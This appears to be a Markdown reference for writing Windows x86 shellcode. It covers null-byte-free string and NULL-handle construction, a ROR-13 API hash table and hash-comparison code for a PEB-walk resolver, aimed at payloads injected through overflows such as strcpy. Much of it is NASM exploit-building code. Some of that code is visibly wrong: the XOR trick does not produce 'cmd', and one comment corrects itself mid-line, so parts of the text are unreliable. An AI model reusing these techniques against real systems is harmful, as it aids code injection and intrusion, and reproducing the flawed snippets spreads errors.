String: "cmd\0"  = bytes: 0x63 0x6D 0x64 0x00
As DWORD (little-endian): 0x00646D63  ← contains null!

Fix: push the DWORD and patch the null at runtime, or build byte-by-byte.
```

```nasm
; Null-byte-free stack string construction
xor   eax, eax
push  eax           ; terminate (this IS a null DWORD on the stack but is a STORE, not instruction encoding)
push  0x642F6374    ; "t/cd" — wait, reversed: bytes at lower address first
; String "cmd" reversed in push order:
; push last chars first so ESP ends up pointing to start
; "cmd\0" on stack:
;   [ESP+3] = \0, [ESP+2] = d, [ESP+1] = m, [ESP+0] = c  ← lea eax,[esp] gives "cmd\0"
push 0x00646D63     ; 0x00 is a null — problematic instruction encoding
; Alternative: XOR trick
mov  eax, 0x01656E64   ; "dne\x01" XOR 0x01010101 = "cmd\0"
xor  eax, 0x01010101
push eax
mov  eax, esp       ; pointer to "cmd\0"
```

### UNICODE_STRING (Internal Kernel Structure)

Although exported `A` APIs take `char*`, internally kernel32 converts to `UNICODE_STRING` before calling ntdll. `UNICODE_STRING` has the layout:

```c
typedef struct _UNICODE_STRING {
    USHORT Length;         // byte length (not including null)
    USHORT MaximumLength;  // buffer size in bytes
    PWSTR  Buffer;         // pointer to wide-char string
} UNICODE_STRING;
```

Shellcode targeting `LdrLoadDll` or `LdrGetProcedureAddress` (ntdll native APIs) must build `UNICODE_STRING` structures directly — see `ntdll.md`.

---

## Handle Values

| Constant | Value (x86) | Notes |
|---|---|---|
| `NULL` | `0x00000000` | Invalid/empty handle — null byte in shellcode |
| `INVALID_HANDLE_VALUE` | `0xFFFFFFFF` | Returned on failure by `CreateFile` etc. |
| `GetCurrentProcess()` pseudo-handle | `0xFFFFFFFF` (-1) | Same bit pattern as `INVALID_HANDLE_VALUE` |
| `GetCurrentThread()` pseudo-handle | `0xFFFFFFFE` (-2) | |
| `INFINITE` timeout | `0xFFFFFFFF` | Reused with `WaitForSingleObject` |

The collision between `INVALID_HANDLE_VALUE` and `GetCurrentProcess()` is intentional by design and does not cause issues because `TerminateProcess` and `INVALID_HANDLE_VALUE` are used in different API contexts.

### Null Handle Encoding

When shellcode must push `NULL` (0x00000000) as an argument without embedding null bytes in the instruction stream:

```nasm
; Option 1: xor + push (most common)
xor  eax, eax
push eax

; Option 2: push 0 then fix (if push 0 encodes as 6A 00 — which it does — it has a null byte)
; push byte 0 = 0x6A 0x00 — CONTAINS null byte! Use option 1 instead.

; Option 3: sub then push (for cases where EAX is in use)
xor  ecx, ecx
push ecx
```

`push 0` (opcode `6A 00`) contains a null byte. The idiomatic shellcode pattern is always `xor reg, reg` / `push reg`.

---

## ROR-13 Hash Quick Reference

| Function | Hash (hex) | Null bytes? | Notable bad chars |
|---|---|---|---|
| `VirtualAlloc` | `0x097BC257` | No | None common |
| `VirtualProtect` | `0xE857500D` | No | `\x0D` (CR) |
| `CreateThread` | `0x0935FF15` | No | `\x15` (NAK) |
| `WaitForSingleObject` | `0xB3F5E90D` | No | `\x0D` (CR) |
| `LoadLibraryA` | `0xEC0E4E8E` | No | `\x8E` (high byte) |
| `GetProcAddress` | `0x7802F749` | No | None common |
| `CreateProcessA` | `0x16B3FE72` | No | None common |
| `TerminateProcess` | `0x78B5B983` | No | `\x83` (high byte) |
| `RtlMoveMemory` | `0xD19E4B26` | No | None common |
| `HeapAlloc` | `0x25CF0D14` | No | `\x0D` (CR) |
| `GetCurrentProcess` | `0x1A6A8D00` | **Yes** (`\x00`) | Null in hash DWORD |

### Hash Comparison in PEB Walk

```nasm
; Inside the export name resolution loop:
; EAX = computed ROR-13 hash of current export name
; [target_hash] = the hash we're searching for (e.g., 0x097BC257 for VirtualAlloc)

cmp  eax, 0x97BC257     ; compare with VirtualAlloc hash
je   found              ; found the function
```

For `GetCurrentProcess` (hash `0x1A6A8D00`), the comparison DWORD contains a null byte at position 3. This is fine in the `.text` section of the resolver (the null is in an immediate operand: `CMP EAX, 0x1A6A8D00` = `\x3D\x00\x8D\x6A\x1A`), but problematic if the entire resolver must be null-byte-free (e.g., injected via a `strcpy` overflow). The solution is to XOR the hash with a known key before comparison:

```nasm
; Null-byte-free hash comparison for GetCurrentProcess (0x1A6A8D00)
mov  ebx, 0x1B6B8C01    ; 0x1A6A8D00 XOR 0x01010101
xor  ebx, 0x01010101    ; EBX = 0x1A6A8D00
cmp  eax, ebx
je   found
```

---

## Further Reading

- *The Shellcoder's Handbook* (Anley et al.) — Chapter 3: Windows Shellcode
- *Hacking: The Art of Exploitation* — Stack-based shellcode fundamentals
- Corelan Team tutorials: https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
- Windows API documentation: https://docs.microsoft.com/en-us/windows/win32/api/
- PE format specification: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format

---

*Last updated: 2026-05-17 | Applies to: Windows XP through Windows 11, x86 (32-bit) primary, x64 notes where applicable*
